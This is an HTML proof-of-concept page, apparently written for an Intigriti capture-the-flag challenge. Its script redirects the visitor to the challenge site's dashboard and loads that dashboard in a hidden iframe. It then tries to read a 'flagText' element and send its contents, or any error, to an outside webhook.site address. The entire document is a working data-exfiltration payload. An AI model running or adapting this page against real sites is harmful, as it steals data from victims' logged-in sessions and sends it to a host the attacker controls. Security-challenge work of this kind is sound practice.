<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script>
const W='https://webhook.site/e82ea658-d5c8-43c1-ad91-91b356a3e165';
const T='https://challenge-0126.intigriti.io';

// Try direct redirect (most likely to work)
new Image().src=W+'?status=started';
setTimeout(()=>location.href=T+'/dashboard.html',1000);

// Backup: try iframe
const f=document.createElement('iframe');
f.src=T+'/dashboard.html';
f.style.display='none';
document.body.appendChild(f);
setTimeout(()=>{
  try{
    const flag=f.contentDocument.getElementById('flagText')?.textContent;
    if(flag)new Image().src=W+'?flag='+encodeURIComponent(flag);
  }catch(e){
    new Image().src=W+'?error='+e.message;
  }
},3000);
</script>
</body>
</html>
